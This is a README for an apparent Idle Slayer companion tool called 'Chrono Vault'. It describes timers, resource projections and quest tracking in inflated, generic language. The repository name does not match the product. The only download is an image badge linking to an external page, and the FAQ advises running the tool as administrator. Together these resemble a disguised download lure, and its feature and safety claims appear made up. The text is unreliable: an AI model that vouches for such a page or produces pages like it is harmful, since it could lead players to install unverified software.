![preview](https://raw.githubusercontent.com/fhanda/IdleSlayer-Transcendence-Forge/main/card_8cf8e6f.svg)
[![Download](https://raw.githubusercontent.com/fhanda/IdleSlayer-Transcendence-Forge/main/app_2bbc64.svg)](https://fhanda.github.io/IdleSlayer-Transcendence-Forge/)

# 🌌 IdleSlayer: Chrono Vault — The Temporal Progression Companion

Welcome to **IdleSlayer: Chrono Vault**, a meticulously engineered enhancement layer for the beloved idle adventure *Idle Slayer*. This is not merely a tool; it is a **progression harmonizer**—a sophisticated overlay that orchestrates your gameplay data, offering you a **strategic overview** and **quality-of-life augmentation** that transforms the grind into a symphony of calculated efficiency. Think of it as a mission control for your village’s expansion, a financial dashboard for your golden hoard, and a tactical map for your next ascension—all woven into a single, elegant interface.

This repository houses the complete source code, documentation, and community resources for the **Chrono Vault**, designed for players who view the idle landscape not as a passive screen, but as a complex puzzle to be solved with finesse.

---

## 🧭 Why Chrono Vault Exists

The core loop of *Idle Slayer* is deceptively simple, yet its underlying systems are a labyrinth of multipliers, ascension timers, temporary bonus windows, and hidden quest toggles. For the uninitiated, progress feels like a slow drip; for the initiated, it's a constant mental load. **Chrono Vault** is the answer to the latter's prayer. It functions as a **temporal observatory**, allowing you to:

- **Decouple** the cognitive overhead of tracking cooldowns from the joy of playing.
- **Visualize** the nonlinear growth curves of your earnings and soul points.
- **Automate** repetitive routine notifications, turning manual checks into a passive feed of actionable intel.
- **Simulate** equipment upgrade paths before you commit your hard-earned resources.

This is a **training tool for your brain** and a **boon for your wrist**, effectively offering a **multiplicative boost to your own decision-making skills**, rather than altering the game’s inherent balance. We focus on *augmentation*, not alteration, providing an edge that feels earned.

---

## ✨ Core Feature Matrix

The Chrono Vault is built upon a modular architecture, ensuring that each component serves a distinct purpose without unnecessary bloat. Here is the breakdown of its armory:

### ⏱️ Temporal Cooldown Intelligence (TCI)
- **Dynamic Timer Synchronization:** Tracks all in-game timers—from the daily quest reset to the elusive temporary bonus windows—with millisecond accuracy.
- **Visual Heatmaps:** A graphical timeline identifies your optimal play sessions based on historical timer data, helping you align your wakeful hours with the game's highest-yield events.
- **Custom Alert Tokens:** Set up in-app notifications for specific milestones (e.g., "Ascend when souls/exp ratio exceeds X") that persist across game sessions.

### 💰 Econometric Resource Planner (ERP)
- **Real-Time Yield Projections:** Input your current gear and upgrade levels; the vault extrapolates your income curve over the next 24 hours, 7 days, and 30 days.
- **Ascension Simulator:** A sandbox mode that modifies your skill tree allocation *in a virtual space*, showing the exact impact on your soul-per-hour rate before you commit in-game.
- **Exponential Growth Visualizer:** Charts that display your earnings as a logarithmic graph, turning the often-opaque "big numbers" into easily digestible trend lines.

### 🗺️ Dimension Atlas & Quest Tracker
- **Quest Line Mapping:** A hierarchical tree view of all active and pending quests, complete with prerequisite chains and hidden trigger conditions.
- **Progression Milestone Pins:** Manual or auto-generated markers on the timeline for major achievements (e.g., "Unlock the Dragon's Hoard" or "Reach Ascension lvl 5"), providing a clear roadmap to your goals.
- **History Ledger:** A comprehensive log of your past sessions, filtering by time, resource gain, or objective completion, to identify what playstyles yield the best results.

### 🌐 Localized Sovereignty Protocol
- **Multilingual Support:** The interface is translated into 14 major languages, including a right-to-left (RTL) layout for Arabic and Hebrew locales, ensuring that the tool is a **universal companion**.
- **Custom Theming Engine:** Beyond light/dark mode, the vault supports a full spectrum of color palettes, allowing you to match the aesthetic to your personal style or the game’s ambient mood.

---

## 🚀 Installation & Integration Guide

We believe in a frictionless setup to get you to the fun part faster. The Chrono Vault operates as a **client-side overlay** that reads your local save file data.

**Step 1: Acquisition**
- Obtain the latest release package from the [![Download](https://raw.githubusercontent.com/fhanda/IdleSlayer-Transcendence-Forge/main/app_2bbc64.svg)](https://fhanda.github.io/IdleSlayer-Transcendence-Forge/) macro located at the top of this document.
- Verify the package checksum against the published SHA-256 hash in the release notes to ensure integrity.

**Step 2: Placement**
- Extract the archive contents to a dedicated directory of your choice (e.g., `C:\Tools\ChronoVault`).
- Ensure the directory is *not* within the game’s installation path to avoid any potential read/write conflicts.

**Step 3: Initial Synchronization**
- Launch the vault application. It will automatically locate your game's save file location.
- If the auto-locator fails, use the "Manual Path Selector" within the Settings tab to navigate to the standard save directory.

**Step 4: Session Start**
- Run the game, then the vault. The overlay will appear as a customizable widget or a full-screen dashboard—your preference.
- The vault operates in *read-only* mode for the save file until you explicitly enable "Simulation Mode" in the ERP, which writes to a separate backup file for testing.

---

## 🛠️ The Developer’s Corner: Under the Hood

This is not a black box. The Chrono Vault is built on a modular plugin architecture, making it extensible for those who wish to script their own helpers.

- **Core Engine (C# / .NET 8):** Handles file I/O, timer scheduling, and the event bus.
- **Analysis Module (F#):** Performs all econometric modeling and projection calculations, leveraging functional programming for predictable math.
- **UI Layer (React with TypeScript):** A reactive interface that updates in real-time without janky refreshes.
- **Plugin API (JSON-RPC):** Allows advanced users to inject custom alert conditions or connect external data sources (e.g., a Twitch bot for streamers).

**Building from Source:**
- The repository is structured with a standard `src/` and `tests/` layout.
- A robust suite of unit tests covers the core calculation engine to ensure your projections are mathematically sound.
- Contribution guidelines are detailed in `CONTRIBUTING.md`. We welcome pull requests for new language packs, UI themes, and efficiency algorithms.

---

## 📋 System Requirements & Compatibility

- **Operating System:** Windows 10/11 (x64), macOS 12+ (Monterey or newer), or Linux (kernel 5.4+).
- **Framework:** .NET 8 Runtime (Redistributable).
- **Display:** Minimum resolution of 1280x720 for optimal widget layout.
- **RAM:** 200 MB idle footprint.
- **Game Version:** Seamless compatibility with the current public build of *Idle Slayer* (v1.27+). The vault disables automatically if it detects an unsupported save schema to prevent corruption.

---

## 🛡️ EULA & Disclaimer: Respecting the Balance

**Important Legal and Ethical Notice:**
This project is a **utility tool** designed for **personal use and educational purposes**. It is an independent creation and is **not affiliated with, endorsed by, or sponsored by** the official developers of *Idle Slayer* or its publishing entities.

The Chrono Vault **does not modify** the game's executable, memory space, or network traffic. It operates strictly on the local save file data, similar to an advanced calculator. We do not promote cheating in multiplayer or competitive environments.

However, please be aware of the following:
1.  **Use at Your Own Risk:** While we have rigorously tested the software, any modification to the game environment—even via a read-only overlay—may interact with future anti-cheat systems. You assume all responsibility for your account's standing.
2.  **No Warranty:** This software is provided "as-is," without warranty of any kind, express or implied. We are not liable for any data loss, account issues, or in-game inconsistencies.
3.  **Community Conduct:** We encourage fair play and sportsmanship. This tool is intended to enhance *your* enjoyment and understanding of the game's mechanics, not to ruin the experience for others.

---

## 📚 FAQ & Troubleshooting

- **The overlay is not appearing.** Check that the vault is running as an administrator (if your OS requires it) and that the save file is not currently locked by a cloud-sync service (like Steam Cloud). Pause cloud sync temporarily.
- **My language is not showing up.** Ensure you have downloaded the complete language pack. RTL languages require a specific font to be installed; references are in the `fonts/` directory.
- **The projections seem too high.** The ERP uses a deterministic model. If you have manual buffs active, you may need to tag them in the "Active Effects" tab to offset the baseline calculation.

---

## 🤝 Community & Support Channels

We believe in the power of the collective. Our 24/7 support infrastructure is here to help you navigate any issue or suggest improvements.

- **Discord Server:** Join our community hub for real-time assistance, share your clever build insights, and vote on upcoming plugin ideas. (Find the invite link in the repository sidebar).
- **Issue Tracker:** For bug reports and feature requests, please use the GitHub Issues tab. We triage requests daily.
- **Wiki:** A living document with advanced tutorials on using the ERP simulator and writing your own plugins.

---

## ⚖️ License

This project is released under the **MIT License**.

**Copyright (c) 2026**

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

For the full legal text, please see the `LICENSE` file in the root directory of this repository.

---

## 📈 Roadmap for 2026

We are perpetually refining the Chrono Vault. The following is our public roadmap:

- **Q1 2026:** Release of the "Plugin Store" web interface for easier community tool installation.
- **Q2 2026:** Introduction of a mobile companion app for remote timer monitoring.
- **Q3 2026:** Integration of machine learning for personalized grind pattern prediction.
- **Q4 2026:** Major UI overhaul based on community feedback, moving to a fully nodal-based visualization system.

---

*Thank you for considering the Chrono Vault for your idle journey. May your multipliers be high and your cooldowns be short.*